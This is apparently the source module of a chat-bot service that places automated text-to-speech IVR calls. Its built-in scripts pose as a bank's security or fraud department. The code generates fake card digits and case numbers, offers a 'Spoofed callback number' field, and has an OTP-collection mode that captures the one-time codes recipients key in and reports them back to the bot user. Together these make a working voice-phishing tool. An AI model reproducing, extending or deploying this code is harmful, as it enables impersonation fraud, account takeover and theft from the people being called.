// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// IVR Outbound Call — Templates, Session Management, Execution
// Allows bot users to place automated IVR calls with TTS audio
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
const { log } = require('console')

// ── Brand name for notifications ──
const BRAND = process.env.CHAT_BOT_BRAND || 'Nomadly'

// ── Trial Caller ID (must be a Telnyx number on the Call Control App) ──
const TRIAL_CALLER_ID = process.env.TELNYX_TRIAL_CALLER_ID || '+18889020132'

// ── Outbound IVR Template Categories ──
const OUTBOUND_CATEGORIES = [
  { key: 'payment', name: 'Payment Alerts', icon: '💳' },
  { key: 'security', name: 'Account Security', icon: '🔒' },
  { key: 'delivery', name: 'Delivery & Service', icon: '📦' },
  { key: 'custom', name: 'Custom Script', icon: '✍️' },
]

// ── Outbound IVR Templates ──
// Each template has: key, name, icon, text (with [Placeholders]), activeKeys
const OUTBOUND_TEMPLATES = {
  payment: [
    {
      key: 'pay_notification',
      name: 'Payment Notification',
      icon: '💳',
      text: 'Hello [Name]. This is [Bank] security department. We are calling regarding a transaction of $[Amount] charged to your card ending in [CardLast4]. Your case number is [CaseID]. If you authorized this transaction, you may hang up. If you did not authorize this payment, please press 1 to speak with our fraud prevention team immediately.',
      placeholders: ['Name', 'Bank', 'Amount', 'CardLast4', 'CaseID'],
      activeKeys: ['1'],
    },
    {
      key: 'pay_suspicious',
      name: 'Suspicious Transaction',
      icon: '🚨',
      text: 'This is [Bank] fraud protection services. We have detected a suspicious transaction of $[Amount] on your card ending in [CardLast4]. This alert is due to [Reason]. Reference number [ReferenceNum]. To confirm this was you, press 1. To report as unauthorized and speak with a representative, press 2.',
      placeholders: ['Bank', 'Amount', 'CardLast4', 'Reason', 'ReferenceNum'],
      activeKeys: ['1', '2'],
    },
    {
      key: 'pay_refund',
      name: 'Refund Processing',
      icon: '💰',
      text: 'Hello [Name]. This is [Company] customer service. We are calling to inform you that a refund of $[Amount] is being processed to your account ending in [CardLast4]. Reference number [ReferenceNum]. To confirm and expedite this refund, please press 1. For questions about this refund, press 2.',
      placeholders: ['Name', 'Company', 'Amount', 'CardLast4', 'ReferenceNum'],
      activeKeys: ['1', '2'],
    },
    {
      key: 'pay_invoice',
      name: 'Invoice Due',
      icon: '📋',
      text: 'Hello [Name]. This is [Company] billing department. This is a reminder that your invoice of $[Amount] is due. Your reference number is [ReferenceNum]. To make a payment now, press 1. To discuss payment arrangements, press 2. To confirm this has already been paid, press 3.',
      placeholders: ['Name', 'Company', 'Amount', 'ReferenceNum'],
      activeKeys: ['1', '2', '3'],
    },
  ],
  security: [
    {
      key: 'sec_verification',
      name: 'Account Verification',
      icon: '🔒',
      text: 'This is [Company] security team. We have detected [Reason] on your account from [Location]. For your protection, your account access has been temporarily limited. Your case ID is [CaseID]. To verify your identity and restore full access, press 1. To call us back, dial [CallBack].',
      placeholders: ['Company', 'Reason', 'Location', 'CaseID', 'CallBack'],
      activeKeys: ['1'],
    },
    {
      key: 'sec_password',
      name: 'Password Reset Alert',
      icon: '🔑',
      text: 'Hello. This is [Company]. A password reset was recently requested for your account from [Location]. Reference number [ReferenceNum]. If you made this request, no action is needed. If you did not request this change, press 1 to secure your account immediately.',
      placeholders: ['Company', 'Location', 'ReferenceNum'],
      activeKeys: ['1'],
    },
    {
      key: 'sec_device',
      name: 'New Device Login',
      icon: '📱',
      text: 'Hello [Name]. This is [Company] security. A new device has been used to access your account from [Location]. This has been flagged due to [Reason]. Your case ID is [CaseID]. If this was you, you may hang up. If you do not recognize this activity, press 1 to lock your account and speak with security.',
      placeholders: ['Name', 'Company', 'Location', 'Reason', 'CaseID'],
      activeKeys: ['1'],
    },
  ],
  delivery: [
    {
      key: 'del_confirmation',
      name: 'Delivery Confirmation',
      icon: '📦',
      text: 'Hello [Name]. This is [Company]. Your order is scheduled for delivery today. To confirm your delivery address, press 1. To reschedule delivery, press 2.',
      placeholders: ['Name', 'Company'],
      activeKeys: ['1', '2'],
    },
    {
      key: 'del_appointment',
      name: 'Appointment Reminder',
      icon: '📅',
      text: 'Hello [Name]. This is [Company] calling to confirm your upcoming appointment. Press 1 to confirm. Press 2 to reschedule. Press 3 to cancel your appointment.',
      placeholders: ['Name', 'Company'],
      activeKeys: ['1', '2', '3'],
    },
    {
      key: 'del_subscription',
      name: 'Subscription Renewal',
      icon: '🔄',
      text: 'Hello [Name]. This is [Company]. Your subscription of $[Amount] is due for renewal. To confirm automatic renewal, press 1. To cancel or modify your subscription, press 2.',
      placeholders: ['Name', 'Company', 'Amount'],
      activeKeys: ['1', '2'],
    },
  ],
}

// ── Smart Placeholders ──
// These placeholders have special behavior: auto-generation, preset lists, or number picking
const REASON_PRESETS = [
  'fraud alert',
  'account suspension',
  'unusual activity',
  'security verification',
  'unauthorized transaction',
  'identity confirmation',
  'account review',
  'payment dispute',
  'suspicious login',
  'account compromise',
]

/**
 * Smart placeholder definitions
 * type: 'auto' = auto-generated, 'list' = preset list + custom, 'input' = user text, 'number' = phone number picker
 */
const SMART_PLACEHOLDERS = {
  CardLast4: {
    type: 'auto',
    icon: '💳',
    label: 'Card Last 4',
    description: 'Last 4 digits of card',
    generate: () => String(Math.floor(1000 + Math.random() * 9000)),
  },
  Reason: {
    type: 'list',
    icon: '📋',
    label: 'Call Reason',
    description: 'Reason for the call',
    presets: REASON_PRESETS,
  },
  CaseID: {
    type: 'auto',
    icon: '🔖',
    label: 'Case ID',
    description: 'Unique case reference',
    generate: () => `CASE-${Math.floor(100000 + Math.random() * 900000)}`,
  },
  ReferenceNum: {
    type: 'auto',
    icon: '🔢',
    label: 'Reference Number',
    description: 'Unique reference number',
    generate: () => `REF-${Math.floor(100000 + Math.random() * 900000)}`,
  },
  Location: {
    type: 'input',
    icon: '📍',
    label: 'Location',
    description: 'City, State',
    hint: 'Example: Houston, Texas',
  },
  CallBack: {
    type: 'number',
    icon: '📞',
    label: 'Callback Number',
    description: 'Spoofed callback number',
    hint: ('Select your ' + (process.env.CHAT_BOT_BRAND || 'Nomadly') + ' number or type a custom number'),
  },
}

// Pre-built case-insensitive index for smart-placeholder lookups.
// Lets users type "[bank]" or "[BANK]" in custom scripts and still hit the
// smart-placeholder UI for "Bank" — preventing the case-sensitivity trap that
// caused 2 launched calls with literal "[bank]" / "[Bank]" in production logs.
const _SMART_PLACEHOLDERS_LOWER = Object.fromEntries(
  Object.entries(SMART_PLACEHOLDERS).map(([k, v]) => [k.toLowerCase(), { canonical: k, ...v }])
)

/**
 * Check if a placeholder name is a smart placeholder (case-insensitive)
 */
function isSmartPlaceholder(name) {
  return !!_SMART_PLACEHOLDERS_LOWER[String(name || '').toLowerCase()]
}

/**
 * Get smart placeholder config (case-insensitive lookup).
 * Returned config includes `canonical` so the UI can store / display the
 * canonical name even if the user typed a lowercase variant.
 */
function getSmartPlaceholder(name) {
  return _SMART_PLACEHOLDERS_LOWER[String(name || '').toLowerCase()] || null
}

/**
 * Generate auto-value for a smart placeholder (case-insensitive)
 */
function generatePlaceholderValue(name) {
  const sp = _SMART_PLACEHOLDERS_LOWER[String(name || '').toLowerCase()]
  if (sp?.generate) return sp.generate()
  return null
}

// ── Helper Functions ──

// U5 fix: i18n category names for non-English users
const CATEGORY_I18N = {
  payment:  { fr: 'Alertes de Paiement',   zh: '支付提醒',      hi: 'भुगतान अलर्ट' },
  security: { fr: 'Sécurité du Compte',     zh: '账户安全',      hi: 'खाता सुरक्षा' },
  delivery: { fr: 'Livraison & Service',     zh: '配送与服务',    hi: 'डिलीवरी और सेवा' },
  custom:   { fr: 'Script Personnalisé',     zh: '自定义脚本',    hi: 'कस्टम स्क्रिप्ट' },
}

function getCategoryButtons(lang) {
  return OUTBOUND_CATEGORIES.map(c => {
    const localName = (lang && lang !== 'en' && CATEGORY_I18N[c.key]?.[lang]) || c.name
    return `${c.icon} ${localName}`
  })
}

function getCategoryByButton(buttonText) {
  // Match against all languages
  for (const c of OUTBOUND_CATEGORIES) {
    // English match
    if (buttonText === `${c.icon} ${c.name}`) return c.key
    // i18n matches
    for (const langNames of Object.values(CATEGORY_I18N[c.key] || {})) {
      if (buttonText === `${c.icon} ${langNames}`) return c.key
    }
  }
  return null
}

function getTemplateButtons(categoryKey) {
  const templates = OUTBOUND_TEMPLATES[categoryKey] || []
  return templates.map(t => `${t.icon} ${t.name}`)
}

function getTemplateByButton(categoryKey, buttonText) {
  const templates = OUTBOUND_TEMPLATES[categoryKey] || []
  for (const t of templates) {
    if (buttonText === `${t.icon} ${t.name}`) return t
  }
  return null
}

function getTemplateByKey(templateKey) {
  for (const cat of Object.values(OUTBOUND_TEMPLATES)) {
    for (const t of cat) {
      if (t.key === templateKey) return t
    }
  }
  return null
}

/**
 * Fill template placeholders with user-provided values.
 *
 * Case-INSENSITIVE matching: if the script contains [bank] but the user filled
 * the placeholder under the key "Bank", it is still substituted. This prevents
 * the production-logged failure mode where users typed "[name]" / "[bank]" /
 * "$[Amount]" in custom scripts and those bracket-tokens leaked all the way
 * into the call recipient's audio.
 *
 * Whitespace inside the brackets is also tolerated: "[ Bank ]" is treated the
 * same as "[Bank]".
 *
 * Unfilled placeholders are LEFT AS-IS so the caller can detect them via
 * validateFilled() and refuse to send the call rather than emitting literal
 * "[Bank]" audio. Never silently drop them.
 *
 * @param {string} text - Template text with [Placeholder] markers
 * @param {object} values - { Placeholder: 'value' }
 * @returns {string} Filled text (any unfilled placeholders preserved verbatim)
 */
function fillTemplate(text, values) {
  if (!text) return ''
  // Build a case-insensitive lookup from the provided values
  const lookup = {}
  for (const [k, v] of Object.entries(values || {})) {
    if (k && v != null && String(v).length > 0) {
      lookup[String(k).toLowerCase().trim()] = String(v)
    }
  }
  return text.replace(/\[([^\]\n]+)\]/g, (match, name) => {
    const key = name.toLowerCase().trim()
    return Object.prototype.hasOwnProperty.call(lookup, key) ? lookup[key] : match
  })
}

/**
 * Scan text for any remaining placeholder-shaped tokens [Foo].
 * Used as a pre-flight check before generating TTS / placing a call so we
 * never bill a user for a call where the recipient hears literal
 * "left bracket Bank right bracket".
 *
 * Heuristic: only flags ASCII identifiers (letters/digits/underscore) inside
 * brackets — so brand-prose like "this is [Company XYZ Inc, est. 2010]"
 * (which has spaces / punctuation) is NOT flagged. Real placeholders in our
 * templates are always single-word identifiers like [Name], [Bank], [Amount].
 *
 * @param {string} text - Filled template text
 * @returns {{ ok: boolean, unfilled: string[] }}
 */
function validateFilled(text) {
  const matches = (text || '').match(/\[[^\]\n]+\]/g) || []
  const seen = new Set()
  const unfilled = []
  for (const m of matches) {
    const name = m.slice(1, -1).trim()
    // Only flag things that LOOK like placeholders: single-word identifier
    if (!/^[A-Za-z][A-Za-z0-9_]*$/.test(name)) continue
    const key = name.toLowerCase()
    if (seen.has(key)) continue
    seen.add(key)
    unfilled.push(name)
  }
  return { ok: unfilled.length === 0, unfilled }
}

/**
 * Extract placeholder names from template text
 * @param {string} text - Template text
 * @returns {string[]} List of placeholder names
 */
function extractPlaceholders(text) {
  const matches = text.match(/\[([^\]]+)\]/g) || []
  const seen = new Set()
  return matches.map(m => m.slice(1, -1)).filter(p => {
    if (seen.has(p)) return false
    seen.add(p)
    return true
  })
}

/**
 * Format call preview message
 */
function formatCallPreview(data) {
  const isOtp = data.ivrMode === 'otp_collect'
  const lines = [
    `<b>Review Your Call</b>`,
    ``,
    `📞 Target: <b>${data.targetNumber}</b>`,
    `📱 Caller ID: <b>${data.callerId}</b>`,
  ]

  if (isOtp) {
    lines.push(`🔑 Mode: <b>OTP Collection</b>`)
    lines.push(`🔢 OTP Length: <b>${data.otpLength || 6} digits</b>`)
    lines.push(`🔄 Max Attempts: <b>${data.otpMaxAttempts || 3}</b>`)
  } else {
    lines.push(`⚡ Transfer to: <b>${data.ivrNumber}</b>`)
  }

  if (data.templateName) {
    lines.push(`📋 Template: <b>${data.templateName}</b>`)
  }

  // Show filled placeholder values
  if (data.placeholderValues && Object.keys(data.placeholderValues).length > 0) {
    for (const [key, val] of Object.entries(data.placeholderValues)) {
      const sp = SMART_PLACEHOLDERS[key]
      const icon = sp ? sp.icon : (key === 'Bank' ? '🏦' : key === 'Company' ? '🏢' : key === 'Amount' ? '💲' : key === 'Name' ? '📝' : '📌')
      lines.push(`${icon} ${key}: <b>${val}</b>`)
    }
  }

  lines.push(`🎤 Voice: <b>${data.voiceName || 'Rachel'}</b>`)
  const speedLabel = data.ttsSpeed && data.ttsSpeed !== 1.0 ? `${data.ttsSpeed}x` : 'Normal'
  lines.push(`🎚 Speed: <b>${speedLabel}</b>`)
  lines.push(`🔘 ${isOtp ? 'Trigger' : 'Transfer'} key: <b>${data.activeKeys?.join(', ') || '1'}</b>`)
  if (!isOtp) {
    lines.push(`🎵 Hold Music: <b>${data.holdMusic ? 'ON' : 'OFF'}</b>`)
  }
  const ivrRate = parseFloat(process.env.BULK_CALL_RATE_PER_MIN || '0.15')
  lines.push(`💰 Rate: <b>$${ivrRate.toFixed(2)}/min</b> (from wallet)`)
  lines.push(``)
  lines.push(`Press /yes to place the call`)
  lines.push(`/cancel to abort`)

  return lines.join('\n')
}

/**
 * Format call result notification for bot user
 */
function formatCallNotification(type, data) {
  const time = new Date().toLocaleString()
  const target = data.targetNumber || '?'
  const duration = data.duration || 0
  const mins = duration > 0 ? Math.ceil(duration / 60) : 0
  const durText = duration > 0 ? `${Math.floor(duration / 60)}:${String(duration % 60).padStart(2, '0')}` : '0:00'

  // AMD (Answering Machine Detection) result line
  const amd = data.answeredBy === 'human' ? '\n👤 <b>Human Answered</b>'
    : data.answeredBy === 'machine' ? '\n📬 <b>Voicemail Detected</b>'
    : data.answeredBy === 'fax' ? '\n📠 <b>Fax Machine</b>'
    : ''

  switch (type) {
    case 'calling':
      return `📞 <b>Calling</b> ...${target}\n📱 From: ${data.callerId}\n🏢 Template: ${data.templateName || 'Custom'}`

    case 'answered':
      return `📞 <b>Call connected</b> — playing IVR message...\n📞 ${target}`

    case 'early_hangup':
      return `📵 <b>Target hung up immediately</b>\n📞 ${target} | Duration: ${durText}${amd}\nThe recipient picked up and disconnected right away.`

    case 'no_response':
      return `📵 <b>No response</b> — IVR played but no key pressed\n📞 ${target} | Duration: ${durText}${amd}\nThe message was played but the recipient did not interact.`

    case 'busy':
      return `📵 <b>Line busy</b> — ${target} is on another call\n💰 Charged: 1 min (minimum)`

    case 'key_pressed':
      return `🔘 <b>Caller pressed ${data.digit}</b> — Transferring to ${data.ivrNumber}`

    case 'transferred':
      return `🔗 <b>Caller connected</b> to ${data.ivrNumber}`

    case 'hangup':
      return `📵 <b>Call Ended</b> — Recipient hung up\n📞 ${target} | Duration: ${durText}${amd}\n🔘 Key pressed: ${data.digitPressed || 'None'}`

    case 'no_answer':
      return `📵 <b>No answer</b> — ${target} did not pick up\n💰 Charged: 1 min (minimum)`

    case 'completed':
      if (data.ivrMode === 'otp_collect') {
        const otpResult = data.otpStatus === 'confirmed' ? '✅ Confirmed' : data.otpStatus === 'rejected' ? '❌ Rejected' : data.otpStatus === 'timeout' ? '⏰ Timed Out' : '—'
        return `🔑 <b>OTP Call Completed</b>\n📞 ${target} | Duration: ${durText}${amd}\n🔢 Last OTP: ${data.otpDigits || 'None'}\n📊 Result: ${otpResult}\n🔄 Attempts: ${data.otpAttempt || 0}/${data.otpMaxAttempts || 3}`
      }
      return `✅ <b>Call Completed</b>\n📞 ${target} | Duration: ${durText}${amd}\n🔘 Key pressed: ${data.digitPressed || 'None'}\n🔗 Transferred to: ${data.ivrNumber || '?'}`

    case 'transfer_failed':
      return `❌ <b>Transfer Failed</b>\n📞 ${target} | Duration: ${durText}${amd}\n🔘 Key pressed: ${data.digitPressed || 'None'}\n🔗 Transfer to ${data.ivrNumber || '?'} — No answer`

    case 'failed':
      // Provider (Telnyx/Twilio) rejected the call SYNCHRONOUSLY before it
      // reached the carrier — no callSid was ever created, no status webhook
      // fires, and no billing runs. Prior copy incorrectly said
      // "💰 Charged: 1 min (minimum)" which made users think their wallet was
      // debited. Confirmed against walletLedger for @Padrino_voodoo's failed
      // call to +18032742510 on 2026-07-24: zero ledger entries — user was
      // NOT charged. Fixed 2026-07-24.
      return `❌ <b>Call failed</b> — ${target}\n${data.reason || 'Unknown error'}\n💰 No charge (call never connected)`

    case 'trial_used':
      return `🎉 <b>Free IVR Trial Call Complete!</b>\n\n` +
        `Your trial call connected successfully — that's ${BRAND || 'Nomadly'} Cloud IVR in action!\n\n` +
        `🚀 <b>Upgrade to a Cloud Phone plan to unlock:</b>\n` +
        `✅ Unlimited IVR outbound calls\n` +
        `✅ Your own dedicated Caller ID\n` +
        `✅ Custom voice menus & call routing\n` +
        `✅ Text-to-Speech in 50+ voices\n` +
        `✅ Call recording & real-time analytics\n\n` +
        `📞 Tap <b>Cloud IVR + SIP</b> on the main menu to get started — plans from just <b>$5</b>!`

    default:
      return `📞 Call event: ${type}`
  }
}

module.exports = {
  TRIAL_CALLER_ID,
  OUTBOUND_CATEGORIES,
  OUTBOUND_TEMPLATES,
  SMART_PLACEHOLDERS,
  REASON_PRESETS,
  getCategoryButtons,
  getCategoryByButton,
  getTemplateButtons,
  getTemplateByButton,
  getTemplateByKey,
  fillTemplate,
  validateFilled,
  extractPlaceholders,
  isSmartPlaceholder,
  getSmartPlaceholder,
  generatePlaceholderValue,
  formatCallPreview,
  formatCallNotification,
}
